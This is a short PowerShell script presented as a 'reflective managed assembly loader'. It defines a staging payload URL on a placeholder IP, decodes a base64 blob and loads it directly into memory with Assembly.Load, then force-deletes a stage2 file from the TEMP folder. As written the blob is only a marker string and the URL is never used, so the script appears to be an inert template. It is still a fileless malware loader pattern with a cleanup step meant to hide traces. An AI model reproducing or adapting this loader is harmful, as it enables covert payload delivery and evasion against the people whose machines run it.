<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
$Stage1Url = 'https://198.51.100.240/payload.bin'
$ErrorActionPreference = "Stop"

try {
    $StageBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjp1d3RyY3FxNXU0')
    Write-Verbose ("Assembly byte count: " + $StageBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($StageBytes)
    if ($null -ne $OperationResult) {
        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
